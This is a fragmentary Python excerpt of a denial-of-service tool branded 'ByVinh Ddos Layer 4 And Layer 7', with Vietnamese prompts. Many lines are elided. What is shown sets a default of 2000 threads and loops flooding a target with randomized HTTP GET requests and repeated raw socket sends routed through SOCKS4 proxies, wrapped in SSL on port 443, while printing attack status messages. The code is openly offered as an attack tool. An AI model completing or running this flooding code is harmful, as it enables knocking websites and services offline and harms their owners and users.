...
def logo():
    ...
    print('''
             ByVinh Ddos Layer 4 And Layer 7
...
def numthreads():
    ...
    try:
        print("-----------------------------")
        threads = int(input("[*] mặc định [2000]: "))
    except ValueError:
        threads = int(2000)
        ...
        while True:
            try:
                if method_attack == "1":
                    ...
                    requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
                print("[+] Attack web | By Vinh @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                while True:
                    try:
                        for _ in range(100):
                            if method_attack == "1":
            ...
            try:
                ...
                try:
                    ...
                    if str(port) == '443':
                        s = ssl.wrap_socket(s)
                    s.send(str.encode(request))
                    print("[!] ByVinh | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print("[+] Attack web | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                #req_code += 1
                try:
                    for y in range(multiple):
                        #req_code += 1
